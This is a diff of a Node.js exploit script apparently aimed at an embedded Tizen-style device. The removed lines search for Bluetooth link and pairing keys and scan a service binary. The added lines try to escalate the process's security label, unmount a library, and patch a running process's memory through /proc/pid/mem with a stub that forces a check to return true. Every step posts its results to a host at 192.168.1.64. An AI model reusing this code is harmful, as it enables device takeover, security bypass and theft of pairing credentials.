@@ -3,53 +3,59 @@ var fs = require("fs");
 var http = require("http");
 var cp = require("child_process");
 
-function post(path, body, cb) {
+function post(path, body) {
     var data = JSON.stringify(body);
     var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
         headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
-        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); if (cb) cb(null); });
-    req.on("error", function (e) { console.log("post err " + path + " " + e.message); if (cb) cb(e); });
+        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
+    req.on("error", function (e) { console.log("post error " + e.message); });
     req.write(data);
     req.end();
 }
-
 function sh(cmd, cap) {
-    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 10000); }
+    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 1500); }
     catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
 }
-
-function stringsOf(buf, minLen) {
-    var out = [];
-    var cur = "";
-    for (var i = 0; i < buf.length; i++) {
-        var c = buf[i];
-        if (c >= 32 && c < 127) cur += String.fromCharCode(c);
-        else { if (cur.length >= (minLen || 5)) out.push(cur); cur = ""; }
-    }
-    return out;
-}
-
 var out = {};
-out.started = new Date().toISOString();
-out.find_keys = sh("find /opt/var /var/lib /home/owner /opt/usr /opt/etc -maxdepth 5 \\( -iname '*linkkey*' -o -iname '*link_key*' -o -iname '*pairing*' -o -iname '*bt_key*' -o -iname '*irk*' -o -iname '*ltk*' \\) 2>/dev/null | head -25");
-out.bt_dirs = sh("ls -laR /opt/var/lib/bluetooth /var/lib/bluetooth /opt/var/opt/bluetooth 2>/dev/null | head -30; echo ===; find /home/owner /opt/usr/apps /opt/usr/data -maxdepth 3 -iname '*bt*' -o -maxdepth 3 -iname '*bluetooth*' 2>/dev/null | head -25");
-out.btservice = sh("ls -la /usr/bin/bt-service /usr/bin/bt-monitor 2>&1; ls -laR /opt/var/btservice /opt/var/bluetooth 2>/dev/null | head -20");
-out.db_grep = sh("find /opt/var /home/owner -name '*.db' -size -5M 2>/dev/null | head -20 | while read f; do if grep -a -l -iE 'linkkey|link_key|7C:64:56' $f 2>/dev/null; then echo HIT:$f; fi; done");
-out.btmon = sh("hciconfig -a 2>&1 | head -20; echo ===; btmgmt info 2>&1 | head -10");
-post("/bt1", out);
+try { fs.writeFileSync("/proc/self/attr/current", "*"); out.star = "WRITE_OK"; } catch (e) { out.star = "ERR " + e.message; }
+try { out.mylbl = fs.readFileSync("/proc/self/attr/current", "utf8"); } catch (e) { out.mylbl = "ERR " + e.message; }
+out.unmount = sh("umount -l /usr/lib/libVDCurl.so.0.9 2>&1; echo ok");
+post("/star_a", out);
 
-var scan = {};
-scan.started = out.started;
-try {
-    var buf = fs.readFileSync("/usr/bin/bt-service");
-    var strs = stringsOf(buf, 6);
-    var rx = /(link.?key|pairing|bond|auth|pin|passkey|7C:64|spoof|hid|HID|sco|SCO|mic|voice|audio)/i;
-    var keep = [];
-    for (var s = 0; s < strs.length && keep.length < 70; s++) {
-        if (rx.test(strs[s])) keep.push(strs[s].slice(0, 130));
-    }
-    scan.btservice_size = buf.length;
-    scan.hits = keep;
-} catch (e) { scan.err = String(e.message || e); }
-post("/bt2", scan);
-post("/bt_done", { started: out.started });
+setTimeout(function () {
+    var o = {};
+    try {
+        var c = cp.spawn("/usr/bin/acr", [], { detached: true, stdio: "ignore" });
+        c.unref();
+        o.spawn = "pid=" + c.pid;
+    } catch (e) { o.spawn = "ERR " + e.message; }
+    post("/star_b", o);
+}, 2500);
+
+setTimeout(function () {
+    var o = {};
+    try {
+        var ps = cp.execSync("ps -ef | grep '/usr/bin/acr' | grep -v grep | head -1", { encoding: "utf8" });
+        o.ps_line = ps.trim();
+        var pid = ps.trim().split(/[ \t]+/)[1];
+        var maps = fs.readFileSync("/proc/" + pid + "/maps", "utf8");
+        var target = null;
+        maps.split("\n").forEach(function (L) {
+            var m = L.match(/^([0-9a-f]+)-[0-9a-f]+ r-xp 00000000 .*libVDCurl/);
+            if (m) target = parseInt(m[1], 16) + 0xbc24;
+        });
+        o.patch_addr = target ? "0x" + target.toString(16) : "NOT FOUND";
+        if (target) {
+            var mem = fs.openSync("/proc/" + pid + "/mem", "r+");
+            var b = new Buffer(4);
+            fs.readSync(mem, b, 0, 4, target);
+            o.before = b.toString("hex");
+            var stub = new Buffer([0x01, 0x20, 0x70, 0x47]);
+            fs.writeSync(mem, stub, 0, 4, target);
+            fs.readSync(mem, b, 0, 4, target);
+            o.after = b.toString("hex");
+            fs.closeSync(mem);
+        }
+    } catch (e) { o.err = "" + (e.stack || e.message); }
+    post("/star_c", o);
+}, 8000);
